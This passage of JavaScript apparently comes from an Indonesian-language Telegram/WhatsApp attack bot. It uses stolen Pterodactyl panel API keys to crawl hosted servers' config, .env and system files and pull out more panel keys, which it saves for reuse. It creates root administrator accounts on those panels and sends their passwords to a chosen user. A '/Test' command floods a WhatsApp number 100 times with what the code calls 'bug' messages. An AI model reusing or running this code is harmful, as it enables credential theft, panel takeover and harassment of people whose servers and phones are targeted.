  const baseUrl2 = d => { let u=String(d||'').trim(); if(!/^https?:\/\//i.test(u)) u='https://'+u; try{ const {origin}=new URL(u); return origin }catch{ return u.replace(/\/+$/,'') } }
  const uniq = a => [...new Set(a)]
  const normSig = (d,la,lc) => `${String(d).trim().toLowerCase()}|${String(la).trim()}|${String(lc).trim()}`

  const nowMs = () => Date.now()
  let lastEdit = 0
  const shouldEdit = (ms=1200) => nowMs()-lastEdit>=ms

  const readTextWith = async (base, token, sid, filePath) => {
    const r = await httpGet(`${base}/api/client/servers/${sid}/files/contents?file=${encodeURIComponent(filePath)}`, token)
    if (r.status === 200) return asText(r.data)
    throw new Error(String(r.status||''))
  }
  const readTextAny = async (base, ptlc, ptla, sid, filePath) => {
    if (isPtlc(ptlc)) { try { return await readTextWith(base, ptlc, sid, filePath) } catch {} }
    if (isPtla(ptla)) { try { return await readTextWith(base, ptla, sid, filePath) } catch {} }
    throw new Error('read_fail')
  }
  const listDirWith = async (base, token, sid, dir) => {
    const r = await httpGet(`${base}/api/client/servers/${sid}/files/list?directory=${encodeURIComponent(dir)}`, token)
    if (r.status === 200) return (r.data?.data||[]).map(x=>x.attributes||x)
    throw new Error(String(r.status||''))
  }
  const listDirAny = async (base, ptlc, ptla, sid, dir) => {
    if (isPtlc(ptlc)) { try { return await listDirWith(base, ptlc, sid, dir) } catch {} }
    if (isPtla(ptla)) { try { return await listDirWith(base, ptla, sid, dir) } catch {} }
    return []
  }

  const extractTriples = (txt, fallbackDom = "") => {
    const out = []
    const domKey = txt.match(/\b(domain|panel|baseUrl|host|api)\b\s*[:=]\s*['"`]([^'"`]+)['"`]/i)?.[2]
    const domUrl = txt.match(/https?:\/\/[^\s'",)]+/i)?.[0]
    const domain = baseUrl2(domKey || domUrl || fallbackDom || "")
    const las = uniq([
      ...[...txt.matchAll(/\bptla_[A-Za-z0-9._-]+/gi)].map(m=>m[0]),
      ...[...txt.matchAll(/\bplta\s*[:=]\s*['"`](ptla_[^'"`]+)['"`]/gi)].map(m=>m[1]||'')
    ].filter(Boolean))
    const lcs = uniq([
      ...[...txt.matchAll(/\bptlc_[A-Za-z0-9._-]+/gi)].map(m=>m[0]),
      ...[...txt.matchAll(/\bpltc\s*[:=]\s*['"`](ptlc_[^'"`]+)['"`]/gi)].map(m=>m[1]||'')
    ].filter(Boolean))
    const blocks = [...txt.matchAll(/\bdomain\b[\s\S]{0,200}?['"`]([^'"`]+)['"`][\s\S]{0,400}?\bptla[\s:=`'"]+?(ptla_[^'"` \t\r\n]+)[\s\S]{0,200}?\bptlc[\s:=`'"]+?(ptlc_[^'"` \t\r\n]+)/gi)]
    for (const b of blocks) out.push({ domain: baseUrl2(b[1]), ptla: b[2], ptlc: b[3] })
    const len = Math.min(las.length, lcs.length)
    for (let i=0;i<len;i++) out.push({ domain, ptla: las[i], ptlc: lcs[i] })
    const seen = new Set()
    return out.filter(t => {
      const sig = normSig(t.domain,t.ptla,t.ptlc); if (seen.has(sig)) return false; seen.add(sig); return /^ptla_/i.test(t.ptla)&&/^ptlc_/i.test(t.ptlc)
    })
  }

  const textLike = (name) => {
    const s = String(name).toLowerCase()
    if (s.includes('node_modules') || s.includes('.git') || s.includes('vendor')) return false
    if (/\.(log|zip|tar|gz|xz|7z|png|jpg|jpeg|webp|pdf|bin|so|o|class|jar|wasm|map)$/i.test(s)) return false
    if (/\.(js|mjs|cjs|ts|tsx|json|env|txt|cfg|ini|conf|yml|yaml)$/i.test(s)) return true
    if (/(settings|config|session|creds|secret|env)/i.test(s)) return true
    return false
  }

  const QUICK = [
    '/home/container/settings.js',
    '/home/container/bot/settings.js',
    '/home/container/data/settings.js',
    '/home/container/config.js',
    '/home/container/bot/config.js',
    '/home/container/env.js',
    '/home/container/.env',
    '/home/container/.env.local',
    '/home/container/.env.production',
    '/settings.js',
    '/config.js',
    '/config/settings.js'
  ]

  const ROOTS_STAGE1 = [
    '/home/container',
    '/home/container/bot',
    '/home/container/data',
    '/home/container/config',
    '/home/container/session',
    '/app'
  ]
  const ROOTS_STAGE2 = [
    '/home', '/container', '/root', '/etc', '/var/www', '/srv'
  ]

  const allAdp = loadADP()
  const target = (match?.[1] || "").trim()
  if (target && !allAdp[target]) return bot.sendMessage(chatId, errBox([`Alias '${target}' tidak ditemukan`]), { parse_mode: "Markdown" })
  const entries = target ? [[target, allAdp[target]]] : Object.entries(allAdp)

  const existingKeys = Object.keys(allAdp)
  const seenPersist = new Set(Object.values(allAdp).map(v => normSig(v.domain||'', v.ptla||'', v.ptlc||'')))

  const maxIdxFrom = (keys) => keys.reduce((m,k)=>{ const t=/^Kyl(\d+)$/.exec(k); return t?Math.max(m,parseInt(t[1],10)):m },0)
  let KylIdx = maxIdxFrom(existingKeys)

  const saver = pLimit(1)
  const allocKeyAndSave = async (entry) => {
    return saver(async () => {
      const cur = loadADP()
      const keys = Object.keys(cur)
      KylIdx = Math.max(KylIdx, maxIdxFrom(keys))
      let k
      do { KylIdx++; k = `Kyl${KylIdx}` } while (keys.includes(k))
      cur[k] = entry
      saveADP(cur)
      return k
    })
  }

  const listServersAll = async (base, ptlc, ptla) => {
    let a = []
    if (isPtlc(ptlc)) { try { a = await listServersClient(base, ptlc) } catch {} }
    if (!a?.length && isPtla(ptla)) { try { a = await listServersApplication(base, ptla) } catch {} }
    return uniq((a||[]).map(x => JSON.stringify({ id: x.id, name: x.name }))).map(s=>JSON.parse(s))
  }

  const limiter = pLimit(3)
  const fileLimiter = pLimit(16)
  const seenThisRun = new Set()
  const foundKeys = []
  let serverCount = 0
  let fileScan = 0

  const m = await bot.sendMessage(chatId, infBox([`Sedang berjalan…`]), { parse_mode: "Markdown" })
  const updateStatus = async (force=false) => {
    if (!force && !shouldEdit(1400)) return
    lastEdit = nowMs()
    const txt = infBox([
      `Sedang berjalan…`,
      `Server: ${serverCount}`,
      `File discan: ${fileScan}`,
      `ADP tersimpan: ${foundKeys.length}`
    ])
    await bot.editMessageText(txt, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" }).catch(()=>{})
  }

  const handleTriples = async (triples) => {
    for (const t of triples){
      const sig = normSig(t.domain, t.ptla, t.ptlc)
      if (seenPersist.has(sig) || seenThisRun.has(sig)) continue
      seenThisRun.add(sig)
      const key = await allocKeyAndSave({ domain: t.domain, ptla: t.ptla, ptlc: t.ptlc, loc: '1', eggs: '15' })
      foundKeys.push(key)
      await updateStatus()
    }
  }

  const crawlServer = async (base, ptlc, ptla, sid, roots, maxDepth, maxDirs, maxFiles, maxFileBytes) => {
    for (const p of QUICK){
      try { const txt = await readTextAny(base, ptlc, ptla, sid, p); await handleTriples(extractTriples(txt, base)) } catch {}
    }
    const q = [...roots]
    const seen = new Set(q)
    const pending = []
    let depth = 0, expanded = 0, scanned = 0
    while (q.length && depth < maxDepth && expanded < maxDirs && scanned < maxFiles){
      const size = q.length
      for (let i=0;i<size && expanded < maxDirs && scanned < maxFiles;i++){
        const dir = q.shift()
        expanded++
        let items = []; try { items = await listDirAny(base, ptlc, ptla, sid, dir) } catch {}
        const dirs = [], files = []
        for (const it of items){
          const nm = String(it.name||'')
          const isDir = (it.is_file===false)||(it.type==='directory')||(it.directory===true)||(it.is_directory===true)
          if (isDir){
            const child = `${(it.directory||dir).replace(/\/+$/,'')}/${nm}`
            if (!seen.has(child)) dirs.push(child)
          } else {
            files.push({ path: `${(it.directory||dir).replace(/\/+$/,'')}/${nm}`, size: Number(it.size||it.bytes||0) })
          }
        }
        dirs.sort((a,b)=>{
          const pr = t => /(settings|config|env|session|creds|data|bot|src|server|service|storage|cache)/i.test(t) ? -1 : 0
          return pr(a)-pr(b) || a.localeCompare(b)
        })
        for (const d of dirs){ if (!seen.has(d)){ seen.add(d); q.push(d) } }
        files.sort((a,b)=>{
          const pr = t => /(settings|config|env|session|creds)/i.test(t) ? -1 : 0
          return pr(a.path)-pr(b.path)
        })
        for (const f of files){
          if (!textLike(f.path)) continue
          if (f.size && f.size > maxFileBytes) continue
          scanned++; fileScan++
          pending.push(fileLimiter(async ()=>{
            try{
              const txt = await readTextAny(base, ptlc, ptla, sid, f.path)
              await handleTriples(extractTriples(txt, base))
            }catch{}
          }))
          if (scanned >= maxFiles) break
        }
      }
      depth++
      await updateStatus()
    }
    await Promise.all(pending)
  }

  const plans = []
  await Promise.all((target ? [[target, allAdp[target]]] : Object.entries(allAdp)).map(([alias, cfg]) => limiter(async () => {
    const base = baseUrl2(cfg.domain)
    const servers = await listServersAll(base, cfg.ptlc, cfg.ptla)
    plans.push({ base, ptlc: cfg.ptlc, ptla: cfg.ptla, servers })
  })))

  for (const plan of plans){
    for (const srv of plan.servers){
      serverCount++
      await updateStatus()
      await crawlServer(plan.base, plan.ptlc, plan.ptla, srv.id, ROOTS_STAGE1, 5, 2000, 3000, 2_000_000)
    }
  }

  const needStage2 = foundKeys.length === 0
  if (needStage2){
    for (const plan of plans){
      for (const srv of plan.servers){
        await crawlServer(plan.base, plan.ptlc, plan.ptla, srv.id, ROOTS_STAGE2, 4, 1500, 2500, 1_500_000)
      }
    }
  }

  await updateStatus(true)

  const msgDone = foundKeys.length
    ? okBox([`✦ Selesai — ${foundKeys.length} ADP tersimpan`, ...foundKeys])
    : errBox([`Tidak ada ADP baru ditemukan`])

  try { await bot.editMessageText(msgDone, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" }) }
  catch { bot.sendMessage(chatId, msgDone, { parse_mode: "Markdown" }) }
})


// /listserver <alias>
bot.onText(/^\/Xlistserver\s+(\S+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa melihat jumlah server!");

  const alias = m[1];
  const data = loadADP();
  const cfg = data[alias];
  if (!cfg) return bot.sendMessage(chatId, errBox([`Alias '${alias}' tidak ditemukan!`]), { parse_mode: "Markdown" });

  const base = baseUrl(cfg.domain);
  try {
    const servers = await listServersWithFallback(base, cfg.ptlc, cfg.ptla);
    const count = Array.isArray(servers) ? servers.length : 0;
    await bot.sendMessage(chatId, okBox([`Jumlah server untuk '${alias}' : ${count}`]), { parse_mode: "Markdown" });
  } catch (e) {
    const msgErr = e?.response ? `${e.response.status} ${e.response.statusText || ""}`.trim() : (e.message || "gagal");
    await bot.sendMessage(chatId, errBox([`Gagal ambil daftar server untuk '${alias}': ${msgErr}`]), { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/Xcreateadminpanel\s+(\S+),\s*(\S+),\s*(\d+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, "Hanya Owner yang bisa membuat admin panel!");

  const alias = m[1];
  const username = m[2];
  const targetId = parseInt(m[3], 10);

  const data = loadADP();
  const cfg = data[alias];
  if (!cfg) return bot.sendMessage(chatId, errBox([`Alias '${alias}' tidak ditemukan!`]), { parse_mode: "Markdown" });

  if (!isPtla(cfg.ptla)) {
    return bot.sendMessage(chatId, errBox([`Alias '${alias}' tidak memiliki ptla (Application API). Tidak bisa membuat user nyata.`]), { parse_mode: "Markdown" });
  }

  const b = baseUrl(cfg.domain);
  const password = `${username}001`; // sesuai permintaan
  try {
    const payload = {
      username: username,
      email: `${username}@${(cfg.domain || 'example.com').replace(/^https?:\/\//,'').split('/')[0]}`,
      first_name: username,
      last_name: "Admin",
      password: password,
      root_admin: true 
    };

    const url = `${b}/api/application/users`;
    const r = await httpPost(url, cfg.ptla, payload);

    if (!r || (r.status < 200 || r.status >= 300)) {
     
      const msgErr = r ? `${r.status} ${r.statusText || ""}`.trim() : "no response";
      return bot.sendMessage(chatId, errBox([`Gagal membuat user di panel ${b}: ${msgErr}`]), { parse_mode: "Markdown" });
    }

    
    const domainHost = (cfg.domain || b).replace(/^https?:\/\//,'').replace(/\/+$/,'');
    const sendLines = [
      `Admin panel dibuat ✅`,
      `Domain : ${domainHost}`,
      `Username: ${username}`,
      `Password: ${password}`
    ];
    try {
      await bot.sendMessage(targetId, okBox(sendLines), { parse_mode: "Markdown" });
      await bot.sendMessage(chatId, okBox([`Sukses: kredensial dikirim ke ${targetId}`]), { parse_mode: "Markdown" });
    } catch (e) {
      
      await bot.sendMessage(chatId, errBox([`User dibuat, tapi gagal kirim ke ${targetId}: ${e.message || ''}`]), { parse_mode: "Markdown" });
    }
  } catch (e) {
    
    await bot.sendMessage(chatId, errBox([`Error saat membuat user: ${e.message || ''}`]), { parse_mode: "Markdown" });
  }
});






//CASE BUG
bot.onText(/\/Test(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;


    // Cek input
    if (!match[1] || !match[1].trim()) {
        return bot.sendMessage(chatId, "❌ Input kosong. Contoh: /SadiceQuota 628xxxxxx");
    }

    // Ambil nomor dari input (hanya angka)
    const nomor = match[1].replace(/[^0-9]/g, '');

    // Validasi nomor
    if (!/^\d{9,15}$/.test(nomor)) {
        return bot.sendMessage(chatId, "❌ Nomor tidak valid. Contoh: /SadiceQuota 628xxxxxx");
    }

    // Bikin target untuk WhatsApp JID
    const target = nomor + "@s.whatsapp.net";

    // Kirim notif awal
    await bot.sendVideo(chatId, "https://files.catbox.moe/a9uco3.mp4", {
        caption: `\`\`\`
┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${target}
┗━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\``,
        parse_mode: "Markdown"
    });

    for (let i = 0; i < 100; i++) {
            await kaylove(sock, target)
            await sleep(220) 
        }
    

    await bot.sendVideo(chatId, "https://files.catbox.moe/a9uco3.mp4", {
        caption: `\`\`\`
┏━━━━⌦ 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 ⌫━━━━━┓
┃ Sᴜᴄᴄᴇss ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ
┃ ᴋᴇᴘᴀᴅᴀ ɴᴏᴍᴏʀ
┃ Tᴀʀɢᴇᴛ  : ${target}
┗━━━━━━━━━━━━━━━━━━━━━━━┛
\`\`\``,
        parse_mode: "Markdown"
    });
});





















const sessions = new Map();
const SESSIONS_DIR = path.join(__dirname, "sessions");
fs.ensureDirSync(SESSIONS_DIR);
const SESSIONS_FILE = path.join(SESSIONS_DIR, "sessions.json");
if (!fs.existsSync(SESSIONS_FILE)) fs.writeFileSync(SESSIONS_FILE, "[]");

let sock;

const fatalCodes = [
  DisconnectReason.loggedOut,   
  DisconnectReason.badSession,  
  401, 403                 
];

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

function saveActiveSessions(botNumber) {
  try {
    const list = fs.existsSync(SESSIONS_FILE) ? JSON.parse(fs.readFileSync(SESSIONS_FILE,'utf8')) : [];
    if (botNumber && !list.includes(botNumber)) list.push(botNumber);
    const tmp = SESSIONS_FILE + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(list, null, 2));
    fs.renameSync(tmp, SESSIONS_FILE);
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

function removeActiveSession(botNumber) {
  try {
    const list = fs.existsSync(SESSIONS_FILE) ? JSON.parse(fs.readFileSync(SESSIONS_FILE,'utf8')) : [];
    const newList = list.filter(n => n !== botNumber);
    const tmp = SESSIONS_FILE + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(newList, null, 2));
    fs.renameSync(tmp, SESSIONS_FILE);
  } catch (error) {
    console.error("Error removing session:", error);
  }
  try {
    const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
    fs.rmSync(deviceDir, { recursive: true, force: true });
  } catch {}
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      

      for (const botNumber of activeNumbers) {
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);             
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ    𝐒𝐓𝐀𝐑𝐓  𝐂𝐎𝐍𝐍𝐄𝐂𝐓   ᵡ͟͟͞͞⏤
┈──────────────────────⏣
║ 𝐒𝐓𝐀𝐓𝐔𝐒 : ⏳...
┃ 𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

sock.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "close") {
    const code = lastDisconnect?.error?.output?.statusCode;
    const isFatal = [401, 403, DisconnectReason.loggedOut, DisconnectReason.badSession].includes(code);

    if (isFatal) {
      await bot.editMessageText(
        `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ    𝐋𝐎𝐒𝐓  𝐂𝐎𝐍𝐍𝐄𝐂𝐓   ᵡ͟͟͞͞⏤
┈──────────────────────⏣ 
┃ 𝐒𝐓𝐀𝐓𝐔𝐒 : ❌
║  𝐑𝐄𝐀𝐒𝐎𝐍 : 𝐁𝐀𝐍𝐍𝐄𝐃 / 𝐋𝐎𝐆𝐎𝐔𝐓
┃ 𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );

      console.log(
        chalk.bgRed.white.bold(
          ` ❌ BOT ${botNumber} TERPUTUS (LOGGED OUT / BANNED) - CODE ${code} `
        )
      );

      try {
        fs.rmSync(sessionDir, { recursive: true, force: true });
      } catch (error) {
        console.error("Error deleting session:", error);
      }

      return;
    } else {
      await bot.editMessageText(
        `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ     𝐑𝐄𝐂𝐎𝐍𝐍𝐄𝐂𝐓     ᵡ͟͟͞͞⏤
┈──────────────────────⏣ 
┃ 𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      console.log(
        chalk.bgYellow.black(
          ` 🔄 LOST CONNECT » ${botNumber} » mencoba reconnect… `
        )
      );
      await new Promise((r) => setTimeout(r, 5000));
      return connectToWhatsApp(botNumber, chatId);
    }
  } else if (connection === "open") {
    sessions.set(botNumber, sock);
    saveActiveSessions(botNumber);
    await bot.editMessageText(
      `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ     𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃      ᵡ͟͟͞͞⏤
┈──────────────────────⏣
║ 𝐒𝐓𝐀𝐓𝐔𝐒 : ✅
┃ 𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
      {
        chat_id: chatId,
        message_id: statusMessage,
        parse_mode: "Markdown",
      }
    );

    console.log(chalk.bgGreen.black(` ✅ CONNECTED » BOT ${botNumber} IS ACTIVE `));
  } else if (connection === "connecting") {
    await new Promise((resolve) => setTimeout(resolve, 1000));

    try {
      let customcode = "13SN-ITCH";

      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        const code = await sock.requestPairingCode(botNumber, "13SNITCH");
        const formattedCode = customcode;
        await bot.editMessageText(
          `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ    𝐏𝐀𝐢𝐑𝐢𝐍𝐆 𝐂𝐎𝐃𝐄    ᵡ͟͟͞͞⏤
┈──────────────────────⏣
║ 𝐂𝐎𝐃𝐄 : ${formattedCode}
┃ 𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        console.log(chalk.bgBlue.white(` 🔄 PAIRING CODE SENT » BOT ${botNumber} » CODE: ${formattedCode} `));
      }

    } catch (error) {
      console.error(chalk.red(`❌ ERROR REQUESTING PAIRING CODE for ${botNumber}: ${error.message}`));

      await bot.editMessageText(
        `
\`\`\`
┈──────────────────────⏣
⏤͟͟͞͞ᵡ    𝐏𝐀𝐢𝐑𝐢𝐍𝐆  𝐄𝐑𝐑𝐎𝐑   ᵡ͟͟͞͞⏤
┈──────────────────────⏣
║  𝐑𝐄𝐀𝐒𝐎𝐍 : ${error.message}
┃  𝐁𝐎𝐓 : ${botNumber}
╰━━━━━━━━━━━━━━━━━━⭓
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    }
  }
});

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

initializeWhatsAppConnections();
console.clear();